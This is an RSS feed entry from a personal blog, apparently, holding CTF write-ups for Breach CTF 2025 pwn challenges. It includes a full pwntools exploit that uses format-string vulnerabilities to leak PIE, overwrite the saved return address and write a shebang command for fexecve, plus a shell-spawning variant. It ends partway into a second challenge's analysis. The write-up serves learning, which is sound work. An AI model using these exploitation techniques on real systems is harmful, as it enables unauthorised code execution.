<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>CTF Writeups on enxgmatic&#39;s hidey hole</title>
        <link>https://enxgmatic.github.io/blog/</link>
        <description>Recent content in CTF Writeups on enxgmatic&#39;s hidey hole</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-gb</language>
        <copyright>enxgmatic</copyright>
        <lastBuildDate>Sat, 10 Feb 2024 19:21:04 +0800</lastBuildDate>
        <atom:link href="https://enxgmatic.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Breach CTF 2025 pwn writeups</title>
            <link>https://enxgmatic.github.io/blog/breach-ctf-2025/</link>
            <pubDate>Thu, 10 Apr 2025 22:09:48 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/blog/breach-ctf-2025/</guid>
            <description>&lt;p&gt;Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pwn/Fswn3d&lt;/code&gt;: format string and fexecve&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pwn/Magicvault&lt;/code&gt;: unlink exploit in a unique context&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pwnfswn3d&#34;&gt;pwn/Fswn3d&lt;/h2&gt;
&lt;h3 id=&#34;analysis---win&#34;&gt;Analysis - win()&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/ctfplayer/breachers/fswn3d/main&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Arch:     amd64-64-little
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    RELRO:    Full RELRO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Stack:    Canary found
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NX:       NX enabled
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    PIE:      PIE enabled
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the source, we are given a win function.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Last weekend, I took part in Breach CTF individually and got 10th place. The pwn challenges were pretty chill, so here are some writeups:</p>
<ul>
<li><code>pwn/Fswn3d</code>: format string and fexecve</li>
<li><code>pwn/Magicvault</code>: unlink exploit in a unique context</li>
</ul>
<h2 id="pwnfswn3d">pwn/Fswn3d</h2>
<h3 id="analysis---win">Analysis - win()</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ctfplayer@enxgmatic:~/breachers/fswn3d$ checksec main
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ctfplayer/breachers/fswn3d/main&#39;</span>
</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span></code></pre></div><p>Looking at the source, we are given a win function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// create a new file descriptor with filename “payload”
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;memfd_create&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// write the value of buffer to the file referred to by the file descriptor
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">148</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;write&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// The file created by `memfd_create` will be executed by fexecve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>fexecve</code> and <code>memfd_create</code> stand out. Based on the man pages, <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><code>memfd_create</code></a> creates an anonymous file (a temporary file in RAM). This created file is then passed to <a href="https://man7.org/linux/man-pages/man3/fexecve.3.html"><code>fexecve</code></a>, which can be viewed as <code>execve</code> but for file descriptors. We can control what is executed by changing the contents of the file.</p>
<p>Ok, but what should we write into the file for <code>fexecve</code> to return the flag?</p>
<p>While typically we can run <code>execve(/bin/sh)</code> to get a shell, if we write <code>/bin/sh</code> to a file descriptor, we get an exec format error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// code to demonstrate memfd_create and fexecve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">]</span> <span class="o">=</span> <span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// output: fexecve: Exec format error
</span></span></span></code></pre></div><p>Following a writeup from <a href="https://ctftime.org/writeup/37692">ctftime</a>, turns out we need to use shebangs, i.e. the characters <code>#!</code>. Written at the start of scripts, they indicate which interpreter to execute the file with.</p>



    <blockquote class="alert alert-note">
        <p class="alert-heading">
            ℹ️
            <b>
                
                    Note
                
            </b>
        </p>
        <p>You may have come across <code>.sh</code> scripts with the first line <code>#!/bin/bash</code>.<br>
When you run such a file using the command <code>./script-name-here.sh</code>, it actually runs <code>/bin/bash ./script-name-here.sh</code>.</p>
    </blockquote>



    <blockquote class="alert alert-note">
        <p class="alert-heading">
            ℹ️
            <b>
                
                    Note
                
            </b>
        </p>
        <p>Another common occurrence of shebangs is at the beginning of python files. For example, in the screenshot, running <code>./sample.py</code> is equivalent to running <code>python3 sample.py</code></p>
    </blockquote>
<figure>
    <img src="assets/fsw_1.png">
    <figcaption>Sample script demonstrating the use of shebangs with python3</figcaption>
</figure>
<p>Therefore, we need to write <code>#!{command here}</code> to the file to execute commands. There are numerous ways we can get the flag from here, below is 2 of them:</p>
<ul>
<li>One is to use <code>#!/bin/cat flag.txt</code> to directly read the flag using <code>cat</code> (I’ll be using this for the writeup).</li>
<li>Another is with <code>#!/bin/sh\n/bin/sh</code>. This pops a shell when executed.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// code to demonstrate memfd_create and fexecve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">152</span><span class="p">]</span> <span class="o">=</span> <span class="err">“#</span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="err">”</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">148</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fexecve&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// output: flag{test}
</span></span></span></code></pre></div><p>Since data from <code>buffer</code> is written into the file, we now need to find a way to control <code>buffer</code> to execute commands.</p>
<h3 id="analysis---main-and-vuln">Analysis - main() and vuln()</h3>
<p>The main function simply calls <code>vuln()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// run vuln()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let’s look at <code>vuln()</code> then.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">last_name</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">**</span><span class="n">hint</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">__builtin_frame_address</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// get input for first_name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your first name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">first_name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">first_name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">first_name</span><span class="p">);</span> <span class="c1">// format string vulnerability
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// get input for last_name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your last name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">last_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">last_name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">last_name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">last_name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">last_name</span><span class="p">);</span> <span class="c1">// format string vulnerability
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It can be clearly seen there are two <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/format-string">format string vulnerabilities</a>, giving us arbitrary read and write.</p>
<p>In summary, we need to make use of the format string vulns to complete the following:</p>
<ul>
<li>Write the string <code>#!/bin/cat flag.txt</code> into <code>buffer</code></li>
<li>Ret2win by overwriting rip</li>
</ul>
<h3 id="exploit">Exploit</h3>
<p>First off, let’s get some leaks. In the context of this challenge, the only one we are concerned with is PIE, since it affects the address of <code>buffer</code> and <code>win()</code>.</p>
<p>After playing around with the input, we can see the 6th offset points to the start of the stack.</p>
<ul>
<li>The address of the saved rip is at offset 7 (this is the variable <code>hint</code>).</li>
<li>The start of <code>first_name</code> is at offset 8, while <code>last_name</code> is at offset 12.</li>
<li>Offset 19, which is the saved rip, will be suitable to obtain a PIE leak.</li>
</ul>
<figure>
    <img src="assets/fsw_2.png">
    <figcaption>The stack</figcaption>
</figure>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./main_patched&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get pie leak</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%19$lx.&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;You entered &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x5555555554b5</span> <span class="o">-</span> <span class="mh">0x0000555555554000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;pie leak:&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span></code></pre></div><p>Now, we are left with only one more input (for <code>last_name</code>).That is certainly not enough to both overwrite the saved rip to win() as well as to write to <code>buffer</code>. So, let’s instead overwrite the rip to point to <code>main()</code> to give ourselves more format string exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite the last byte of rip to the start of main</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%123x</span><span class="s1">%7$hhn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></div>


    <blockquote class="alert alert-note">
        <p class="alert-heading">
            ℹ️
            <b>
                
                    Note
                
            </b>
        </p>
        <p>To explain the payload:</p>
<ul>
<li>123 or 0x7b is the value of the last byte of <code>main()</code>. We only need to overwrite the last byte here since the rest of the bytes in the saved rip is the same as <code>main()</code>.</li>
<li><code>%123x</code> prints out 0x7b characters.</li>
<li><code>%7$hhn</code> writes the number of characters printed out (i.e. 0x7b) to the address stored at offset 7 (i.e. the saved rip). <code>hhn</code> ensures that only 1 byte is overwritten.</li>
</ul>
    </blockquote>
<p>Moving on to <code>buffer</code>, I decided to write one byte of the command at a time, while also overwriting the rip to <code>main()</code> every round. This way, we effectively gain unlimited format string exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite buffer to this command</span>
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;#!/bin/cat flag.txt&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get address of buffer</span>
</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x555555558040</span> <span class="o">-</span> <span class="mh">0x0000555555554000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># overwrite buffer to the command we need, one byte at a time</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;first name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%123x</span><span class="s1">%7$hhn&#39;</span> <span class="c1"># overwrite rip to main, so we can repeat this process</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="c1"># buffer adr to write to, at offset 10, for use in the next input</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">command</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;%10$hhn&#39;</span> <span class="c1"># overwrite buffer one byte at a time</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></div>


    <blockquote class="alert alert-note">
        <p class="alert-heading">
            ℹ️
            <b>
                
                    Note
                
            </b>
        </p>
        <p>You need to write the address of <code>buffer</code> (and specifically in this case, which offset of buffer) somewhere on the stack.</p>
    </blockquote>
<figure>
    <img src="assets/fsw_3.png">
    <figcaption>Our command has successfully been written to `buffer`</figcaption>
</figure>
<p>Finally, let’s overwrite rip to <code>win()</code> (remember PIE exists!). The flag will print out.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite last 2 bytes of rip to win, accounting for pie</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;first name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">win_val</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="p">)[:</span><span class="mi">2</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="n">win_val</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;x%7$hn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Flag: <code>Breach{5h0uldv3_l1573n3d_70_7h3_6cc_w4rn1n65}</code></p>
<h2 id="pwnmagicvault">pwn/MagicVault</h2>
<p>I quite enjoy this challenge, for while it is conceptually simple, it was well disguised within a unique context compared to a typical CRUD binary.</p>
<h3 id="analysis">Analysis</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ctfplayer@enxgmatic:~/breachers/magicvault$ checksec main
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ctfplayer/breachers/magicvault/main&#39;</span>
</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</span></span></code></pre></div><p>Apart from the binary, we are given 3 files: <code>magic_buddy.c</code>, <code>magic_buddy.h</code> and <code>main.c</code>.</p>
<h3 id="analysis---magic_buddy">Analysis - magic_buddy</h3>
<p><code>magic_buddy</code> is an implementation of the buddy memory allocation system. It splits memory into halves to determine the best fit i.e. it uses the memory block size 2<sup>m</sup> which satisfies 2<sup>m-1</sup> &lt; requested size &lt;= 2<sup>m</sup>.</p>
<p>No deep knowledge about the buddy system is actually needed, and most of the code in it is irrelevant to the exploit.</p>
<p>To give a brief overview, <code>init_buddy</code> initialises the buddy memory allocator, which is of the following struct. It includes an array of pointers to freed blocks (<code>avail</code>), the starting memory address where blocks will be allocated to (<code>base</code>), and its largest block size (<code>root_logsize</code>).</p>
